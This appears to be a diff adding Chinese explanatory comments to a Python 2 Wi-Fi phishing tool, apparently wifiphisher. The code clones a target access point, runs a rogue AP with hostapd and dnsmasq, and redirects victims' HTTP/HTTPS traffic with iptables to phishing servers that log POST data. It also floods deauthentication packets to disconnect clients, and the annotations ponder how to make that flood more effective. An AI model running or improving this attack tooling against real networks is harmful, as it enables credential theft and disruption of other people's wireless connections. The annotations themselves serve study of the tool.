@@ -20,6 +20,8 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
 """
+    预备知识：
+    1 无线网卡接口模式：
         Ad-hoc：不带AP的点对点无线网络
         Managed：通过多个AP组成的网络，无线设备可以在这个网络中漫游
         Master：设置该无线网卡为一个AP
@@ -27,6 +29,24 @@ from scapy.all import *
         Secondary：设置为备份的AP/Repeater
         Monitor：监听模式
         Auto：由无线网卡自动选择工作模式
+    2 Scapy涉及到的发包和嗅探
+        scapy可以脱离python使用，在linux用scapy敲一下就可看到包的内容
+        官方文档 http://www.secdev.org/projects/scapy/doc/
+    3 Linux命令及工具
+        建议按网上教程，完全使用命令行配置一遍Linux系统的wifi热点
+        命令：
+            iw
+            iwconfig
+        工具：
+            dhcp
+            hostapd
+            dnsmasq
+    4 攻击姿势
+        克隆：伪造了源头的名称、信道、mac地址
+        抑制源头：这里只使用了双向deauth和广播deauth两种（这个有点弱啊）
+        钓鱼：开两个端口，使用HTTP和HTTPS服务挂钓鱼页面，同时嗅探
+
+    建议先由程序主函数进入，按运行过程理解本代码
 """
 
 
@@ -63,10 +83,11 @@ count = 0  # for channel hopping Thread
 APs = {}  # for listing APs
 hop_daemon_running = True
 terminate = False
+
 # in threading.py
 lock = Lock()
 
-
+#
 def parse_args():
     # Create the arguments
     parser = argparse.ArgumentParser()
@@ -146,7 +167,7 @@ def parse_args():
 
     return parser.parse_args()
 
-
+#
 class SecureHTTPServer(BaseHTTPServer.HTTPServer):
     """
     Simple HTTP server that extends the SimpleHTTPServer standard
@@ -177,7 +198,7 @@ class SecureHTTPServer(BaseHTTPServer.HTTPServer):
         while not self.stop:
             self.handle_request()
 
-
+#
 class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     """
     Request handler for the HTTPS server. It responds to
@@ -204,7 +225,7 @@ class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
         return
 
-
+#
 class HTTPServer(BaseHTTPServer.HTTPServer):
     """
     HTTP server that reacts to self.stop flag.
@@ -218,7 +239,7 @@ class HTTPServer(BaseHTTPServer.HTTPServer):
         while not self.stop:
             self.handle_request()
 
-
+#
 class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     """
     Request handler for the HTTP server that logs POST requests.
@@ -295,7 +316,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
         return
 
-
+#
 def stop_server(port=PORT, ssl_port=SSL_PORT):
     """
     Sends QUIT request to HTTP server running on localhost:<port>
@@ -308,7 +329,7 @@ def stop_server(port=PORT, ssl_port=SSL_PORT):
     conn.request("QUIT", "/")
     conn.getresponse()
 
-
+#
 def shutdown():
     """
     Shutdowns program.
@@ -330,10 +351,11 @@ def shutdown():
     print '\n[' + R + '!' + W + '] Closing'
     sys.exit(0)
 
-
+#
 def get_interfaces():
 
     """
+    获取接口信息
     把机器上的无线网卡按monitor和managed状态分类。存入interfaces并返回
     最终interfaces会是这样:(dict)interfaces={"monitor":[wlan0], "managed":[wlan1], "all":[wlan0, wlan1]}
     """
@@ -366,7 +388,7 @@ def get_interfaces():
                 interfaces["all"].append(iface)
     return interfaces
 
-
+#
 def get_iface(mode="all", exceptions=["_wifi"]):
     '''
     从interface的网卡名称中取出某一类型的值
@@ -377,7 +399,7 @@ def get_iface(mode="all", exceptions=["_wifi"]):
             return i
     return False
 
-
+#
 def reset_interfaces():
     '''
     重新设置无线网卡的状态
@@ -399,7 +421,7 @@ def reset_interfaces():
             # 开启“m”网卡
             Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)
 
-
+#
 def create_virtual_monitor(iface, virtual): 
     try:
         # 使用iface网卡建立一个monitor类型的虚拟接口virtual
@@ -414,7 +436,7 @@ def create_virtual_monitor(iface, virtual):
         ))
     return virtual
 
-
+#
 def get_internet_interface():
     '''return the wifi internet connected iface'''
     inet_iface = None
@@ -440,9 +462,10 @@ def get_internet_interface():
         return inet_iface
     return False
 
-
+#
 def channel_hop(mon_iface):
-    # 信道切换排错
+    # 本函数用于单纯的信道切换,同时结合其他线程完成对11个信道进行扫描的任务
+    # 切换+嗅探=扫描
     chan = 0
     err = None
     while hop_daemon_running:
@@ -473,7 +496,7 @@ def channel_hop(mon_iface):
         except KeyboardInterrupt:
             sys.exit()
 
-
+#
 def sniffing(interface, cb):
     '''
     This exists for if/when I get deauth working
@@ -488,8 +511,9 @@ def sniffing(interface, cb):
     """
     sniff(iface=interface, prn=cb, store=0)
 
-#???
+#
 def targeting_cb(pkt):
+    # 对嗅探到的包进行处理，提取数据并保存
     global APs, count
     if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
         try:
@@ -506,7 +530,7 @@ def targeting_cb(pkt):
         APs[count] = [ap_channel, essid, mac]
         target_APs()
 
-
+#
 def target_APs():
     """
     打印扫描到的AP
@@ -521,7 +545,7 @@ def target_APs():
         print (G + str(ap).ljust(2) + W + ' - ' + APs[ap][0].ljust(2) + ' - ' +
                T + APs[ap][1] + W)
 
-
+#
 def copy_AP():
     """
     获得用户指定AP的channel, essid, mac信息
@@ -548,7 +572,7 @@ def copy_AP():
     except KeyError:
         return copy_AP()
 
-
+#
 def start_ap(mon_iface, channel, essid, args):
     """
     使用hostapd 通过iface channel essid 信息开启伪AP
@@ -577,7 +601,7 @@ def start_ap(mon_iface, channel, essid, args):
     except KeyboardInterrupt:
         shutdown()
 
-
+#
 def dhcp_conf(interface):
     #设置DHCP
     config = (
@@ -591,7 +615,7 @@ def dhcp_conf(interface):
         dhcpconf.write(config % (interface, DHCP_LEASE, NETWORK_GW_IP))
     return '/tmp/dhcpd.conf'
 
-
+#
 def dhcp(dhcpconf, mon_iface):
     # 使用Dnsmasq做DNS缓存服务器和DHCP
     os.system('echo > /var/lib/misc/dnsmasq.leases')
@@ -615,7 +639,7 @@ def dhcp(dhcpconf, mon_iface):
     )
     return True
 
-
+#
 def get_strongest_iface(exceptions=[]):
     """
      1找出所有状态为managed的网卡接口
@@ -647,7 +671,7 @@ def get_strongest_iface(exceptions=[]):
         return interface
     return False
 
-
+#
 def start_mode(interface, mode="monitor"):
     """
     以mode模式开启interface接口（默认为monitor模式）
@@ -664,7 +688,6 @@ def start_mode(interface, mode="monitor"):
 
 
 # Wifi Jammer stuff
-# 干扰wifi
 # TODO: Merge this with the other channel_hop method.
 def channel_hop2(mon_iface):
     '''
@@ -678,11 +701,13 @@ def channel_hop2(mon_iface):
     err = None
 
     while 1:
+        # 如果用户指定信道，就直接攻击该信道
         if args.channel:
             with lock:
                 monchannel = args.channel
         else:
             channelNum += 1
+            # 如果循环完了，信道值超过11，重置channelNum为1，重置first_pass为0
             if channelNum > 11:
                 channelNum = 1
                 with lock:
@@ -695,7 +720,7 @@ def channel_hop2(mon_iface):
                 stdout=DN,
                 stderr=PIPE
             )
-
+            # 判断是否出错
             for line in proc.communicate()[1].split('\n'):
                 if len(line) > 2:
                     # iw dev shouldnt display output unless there's an error
@@ -707,13 +732,14 @@ def channel_hop2(mon_iface):
             time.sleep(.05)
         else:
             # For the first channel hop thru, do not deauth
+            # 外部初始的first_pass=1,这里意思是不对第一次循环的信道进行deauth？
             if first_pass == 1:
                 time.sleep(1)
                 continue
-
+        # 在确定的信道下发起攻击
         deauth(monchannel)
 
-
+#
 def deauth(monchannel):
     '''
     addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway
@@ -735,6 +761,10 @@ def deauth(monchannel):
                 Append the packets to a new list so we don't have to hog the
                 lock type=0, subtype=12?
                 '''
+                # 如果信道是我们AP的信道
+                # 伪造一个源地址是Ap，目标地址是client的Deauth包
+                # 同时伪造一个源地址是client，目标地址是Ap的Deauth包
+                # 双向deauth Flood攻击
                 if ch == monchannel:
                     deauth_pkt1 = Dot11(
                         addr1=client,
@@ -747,12 +777,14 @@ def deauth(monchannel):
                     pkts.append(deauth_pkt1)
                     pkts.append(deauth_pkt2)
     if len(APs) > 0:
+        # 如果用户没有指定directedonly
         if not args.directedonly:
             with lock:
                 for a in APs:
                     ap = a[0]
                     ch = a[1]
                     if ch == monchannel:
+                        # 伪造Ap发Deauth广播包
                         deauth_ap = Dot11(
                             addr1='ff:ff:ff:ff:ff:ff',
                             addr2=ap,
@@ -761,15 +793,18 @@ def deauth(monchannel):
 
     if len(pkts) > 0:
         # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
+        # 如果用户没有通过命令行指定发包间隔，默认为最小值
         if not args.timeinterval:
             args.timeinterval = 0
+        # 如果用户没有指定发包数量，默认每种包发一个
+        # 感觉这里发一个包根本打不掉啊，考虑一下发多少效果最佳？
         if not args.packets:
             args.packets = 1
-
+        # 把pkts里的Deauth包都发出去
         for p in pkts:
             send(p, inter=float(args.timeinterval), count=int(args.packets))
 
-
+#
 def output(monchannel):
     # 交互界面打出被干扰的设备
     wifi_jammer_tmp = "/tmp/wifiphisher-jammer.tmp"
@@ -796,7 +831,7 @@ def output(monchannel):
                 )
         # print ''
 
-
+#
 def noise_filter(skip, addr1, addr2):
     # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast,
     # broadcast
@@ -818,12 +853,22 @@ def noise_filter(skip, addr1, addr2):
         if i in addr1 or i in addr2:
             return True
 
-
+#
 def cb(pkt):
     '''
     Look for dot11 packets that aren't to or from broadcast address,
     are type 1 or 2 (control, data), and append the addr1 and addr2
     to the list of deauth targets.
+
+
+    分析802.11包，找出type为1和2的包，把其中的addr1和addr2加入deauth攻击列表
+
+    802.11数据包的type字段有三种，分别是
+    type=0 managment管理包 包括认证（authentication）、关联（association）和信号（beacon）数据包。
+    type=1 control控制包 包括请求发送（request-to-send）和准予发送（clear-to-send）数据包
+    type=2 data数据包 含有真正的数据
+
+    两个addr分别是数据的接受者和发送者
     '''
     global clients_APs, APs
 
@@ -845,32 +890,43 @@ def cb(pkt):
     that require a lock.
     '''
 
+    '''
+    Dot11() - 802.11数据包
+    '''
+    # 如果pkt数据包含有“802.11”层
     if pkt.haslayer(Dot11):
         if pkt.addr1 and pkt.addr2:
 
             # Filter out all other APs and clients if asked
             if args.accesspoint:
+                # 如果我们要攻击的AP地址不在这两个地址里，退出
                 if args.accesspoint not in [pkt.addr1, pkt.addr2]:
                     return
 
             # Check if it's added to our AP list
+            # 如果包是Beacon类型或者ProbeResponse类型：
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                 APs_add(clients_APs, APs, pkt, args.channel)
 
             # Ignore all the noisy packets like spanning tree
+            # 如果包的特征信息在noise列表里，退出
             if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                 return
 
             # Management = 1, data = 2
+            # 如果包是这两种类型，添加到deauth列表
             if pkt.type in [1, 2]:
                 clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
 
-
+#
 def APs_add(clients_APs, APs, pkt, chan_arg):
+    # 无线网络名字
     ssid = pkt[Dot11Elt].info
+    # mac地址
     bssid = pkt[Dot11].addr3
     try:
         # Thanks to airoscapy for below
+        # 从802.11 Information Element字段得到Ap的channel
         ap_channel = str(ord(pkt[Dot11Elt:3].info))
         # Prevent 5GHz APs from being thrown into the mix
         chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
@@ -894,7 +950,7 @@ def APs_add(clients_APs, APs, pkt, chan_arg):
         with lock:
             return APs.append([bssid, ap_channel, ssid])
 
-
+#
 def clients_APs_add(clients_APs, addr1, addr2):
 
     if len(clients_APs) == 0:
@@ -916,14 +972,15 @@ def clients_APs_add(clients_APs, addr1, addr2):
             with lock:
                 return clients_APs.append([addr1, addr2, monchannel])
 
-
+#
 def AP_check(addr1, addr2):
+    # 检查一个包的两个地址是否与AP列表中所记录的AP有关，有的话把地址加入clients_APs列表
     for ap in APs:
         if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
             with lock:
                 return clients_APs.append([addr1, addr2, ap[1], ap[2]])
 
-
+#
 def mon_mac(mon_iface):
     #获取伪AP的mac
     '''
@@ -936,14 +993,15 @@ def mon_mac(mon_iface):
            + mon_iface + W + ' - ' + O + mac + W)
     return mac
 
-
+#
 def sniff_dot11(mon_iface):
     """
     We need this here to run it from a thread.
     """
+    # scapy.sniff()
     sniff(iface=mon_iface, store=0, prn=cb)
 
-
+#
 def get_hostapd():
     """
     确认本机有hostapd，如果没有自动安装
@@ -982,21 +1040,30 @@ if __name__ == "__main__":
     print "                                                         "
 
     # Parse args
+    # 接收用户输入
     args = parse_args()
+
     # Are you root?
+    # 确保程序以root权限运行
     if os.geteuid():
         sys.exit('[' + R + '-' + W + '] Please run as root')
+
     # Get hostapd if needed
+    # 确保系统已安装hostapd
     get_hostapd()
 
     # TODO: We should have more checks here:
     # Is anything binded to our HTTP(S) ports?
     # Maybe we should save current iptables rules somewhere
+    # 也许这里该检查一下我们的端口是否已经被占用？
+    # 我们也许应该先保存一下当前系统中的配置，让它被修改之后还能复原？
+
 
     # Get interfaces
     # 重设无线网卡的状态
     reset_interfaces()
-    # 找一个靠谱的接口做AP
+
+    # 找一个合适的网卡接口做AP
     strongest_iface = get_strongest_iface()
     if not strongest_iface:
         sys.exit(
@@ -1004,7 +1071,8 @@ if __name__ == "__main__":
              '] No wireless interfaces found, bring one up and try again'
              )
         )
-    # 启动虚拟接口jam0
+
+    # 启动这个接口
     virtual_iface = create_virtual_monitor(strongest_iface, "jam0")
 
 
@@ -1012,6 +1080,7 @@ if __name__ == "__main__":
 
 
     # Set iptable rules and kernel variables.
+    # 配置系统和端口
     os.system(
         ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s' 
         % (NETWORK_GW_IP, PORT))
@@ -1029,21 +1098,30 @@ if __name__ == "__main__":
     print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
 
     # Copy AP
+    '''
+    开启一个线程，让端口在11个信道不停切换，
+    同时嗅探接口收到的包，并按规则处理，得到AP列表，这样就完成了一个扫描AP的过程
+    把AP列表显示在屏幕上让用户选择copy哪一个
+    执行copy操作，此时伪AP还没有启动
+    '''
     time.sleep(3)
-    # 用Thread跳频扫描AP
+    # 开启信道切换的线程
     hop = Thread(target=channel_hop, args=(virtual_iface,))
     # 守护
     hop.daemon = True
     hop.start()
-    # 嗅探端口并处理输出
+    # 嗅探接口并处理输出
     sniffing(virtual_iface, targeting_cb)
     # 复制指定AP的设置
     channel, essid, ap_mac = copy_AP()
-    # 结束守护
+    # 结束线程守护
     hop_daemon_running = False
 
 
     # Start AP
+    '''
+    使用DHCP启动伪AP
+    '''
     start_ap(strongest_iface, channel, essid, args)
     dhcpconf = dhcp_conf(strongest_iface)
     if not dhcp(dhcpconf, strongest_iface):
@@ -1058,6 +1136,7 @@ if __name__ == "__main__":
 
     # With configured DHCP, we may now start the web server
     # Start HTTP server in a background thread
+    # 后台开启HTTP服务
     Handler = HTTPRequestHandler
     try:
         httpd = HTTPServer((NETWORK_GW_IP, PORT), Handler)
@@ -1072,7 +1151,9 @@ if __name__ == "__main__":
     webserver = Thread(target=httpd.serve_forever)
     webserver.daemon = True
     webserver.start()
+
     # Start HTTPS server in a background thread
+    # 后台开启HTTPS服务
     Handler = SecureHTTPRequestHandler
     try:
         httpd = SecureHTTPServer((NETWORK_GW_IP, SSL_PORT), Handler)
@@ -1091,31 +1172,37 @@ if __name__ == "__main__":
 
     time.sleep(3)
 
-    clients_APs = []
-    APs = []
+    clients_APs = [] # 用户列表
+    APs = [] # AP列表
     args.accesspoint = ap_mac
     args.channel = channel
     monitor_on = None
     conf.iface = strongest_iface
+
     # 得到伪AP的mac
     mon_MAC = mon_mac(strongest_iface)
+
+    # 请结合channel_hop2()查看其作用
     first_pass = 1
 
     monchannel = channel
+
     # Start channel hopping
+    # 启动跳信道的线程，进行deauth攻击
     hop = Thread(target=channel_hop2, args=(virtual_iface,))
     hop.daemon = True
     hop.start()
 
     # Start sniffing
+    # 启动嗅探线程
     sniff_thread = Thread(target=sniff_dot11, args=(virtual_iface,))
     sniff_thread.daemon = True
     sniff_thread.start()
 
     # Main loop.
+    # 读数据，与用户交互
     try:
         while 1:
-            # 控制屏幕输出
             os.system("clear")
             print "Jamming devices: "
             if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
